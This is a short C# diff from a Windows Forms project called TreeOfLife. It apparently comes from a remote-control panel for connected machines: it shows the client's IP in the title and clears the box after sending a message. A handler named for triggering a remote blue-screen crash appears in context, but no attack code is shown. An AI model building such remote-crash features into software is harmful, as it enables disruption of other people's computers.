@@ -28,6 +28,7 @@ namespace TreeOfLife
             InitializeComponent();
 
             this.b = b;
+            this.Text = b.IP;
         }
 
         private void SendMessageBtn_Click(object sender, EventArgs e)
@@ -38,9 +39,10 @@ namespace TreeOfLife
                 MessageBox.Show("Enter A Message!");
             }else
             {
+                //b.SendCommand(1);
                 b.SendMessage(message);
+                SendMessageBox.Text = "";
             }
-
         }
 
         private void BSODBtn_Click(object sender, EventArgs e)
